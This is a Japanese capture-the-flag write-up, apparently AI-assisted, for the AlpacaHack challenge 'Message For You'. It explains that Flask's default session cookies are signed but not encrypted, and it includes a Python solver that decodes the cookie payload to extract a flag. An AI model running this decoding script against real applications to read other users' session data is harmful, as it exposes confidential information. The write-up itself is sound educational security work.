> [!IMPORTANT]
> **Solved with Google Antigravity**
> この問題は Google の強力な AI コーディングアシスタント **Antigravity** を活用して解決されました。

# Daily AlpacaHack: Message For You - Writeup

## 概要 (Summary)
この問題は Flask Web アプリケーションのセッション管理に焦点を当てたものです。
サーバーはランダムな秘密鍵を使用していますが、Flask のデフォルト設定ではセッション内容は暗号化されず、クライアント側でデコード可能な状態で保持されるという脆弱性（または仕様）を利用してフラグを取得します。

## 脆弱性の詳細 (Vulnerability Details)
Flask のデフォルトのセッション管理（`SecureCookieSessionInterface`）では、セッションデータは以下の形式でクライアントのクッキーに保存されます。
`[圧縮マーカー].[Base64化されたペイロード].[タイムスタンプ].[署名]`

このうち、「ペイロード」部分は単に Base64 エンコード（必要に応じて zlib 圧縮）されているだけであり、シークレットキーがなくても読み取りが可能です。シークレットキーは、サーバーが「改ざん」を検知するためにのみ使用されます。

本件の `app.py` では、フラグを含むメッセージがセッションに保存されています。
```python
session["message"] = MESSAGE  # MESSAGE に FLAG が含まれる
```
そのため、クッキーからペイロードを取り出してデコードするだけで、フラグを閲覧することが可能です。

## 解決手順 (Solution Steps)
1. 生成されたターゲットサイトの URL にアクセスし、レスポンスヘッダーから `session` クッキーを取得します。
2. 取得したクッキーのドット (`.`) で区切られた第1セグメント（圧縮されている場合は第2セグメント）を抽出します。
3. 抽出した文字列を Base64 デコードします。
4. 内容が zlib 圧縮されている場合は解凍します。
5. 出力された JSON データ内の `message` キーからフラグを確認します。

## 解決スクリプト (Solver)
以下のスクリプトを使用して、自動的にフラグを取得できます。

### 実行方法
```bash
python3 solve.py <TARGET_URL>
```

### solve.py
```python
import requests
import base64
import zlib
import json
import sys
import re

def solve(url):
    response = requests.get(url)
    session_cookie = response.cookies.get("session")
    
    if not session_cookie:
        return

    parts = session_cookie.split('.')
    if session_cookie.startswith('.'):
        payload_b64 = parts[1]
        is_compressed = True
    else:
        payload_b64 = parts[0]
        is_compressed = False

    payload_b64 += '=' * (-len(payload_b64) % 4)
    decoded_bytes = base64.urlsafe_b64decode(payload_b64)

    if is_compressed:
        decoded_bytes = zlib.decompress(decoded_bytes)

    data = json.loads(decoded_bytes)
    if "message" in data:
        message = data["message"]
        flag = re.search(r"Alpaca\{.*?\}", message)
        if flag:
            print(f"FLAG: {flag.group(0)}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <url>")
        sys.exit(1)
    solve(sys.argv[1])
```

## 感想
Flask のセッションがデフォルトで暗号化されないことは非常に有名な性質ですが、CTF の導入として非常に勉強になる良い問題でした。
シークレットキーがランダム生成されていても、読み取りに関しては無力であるという教訓が得られました。
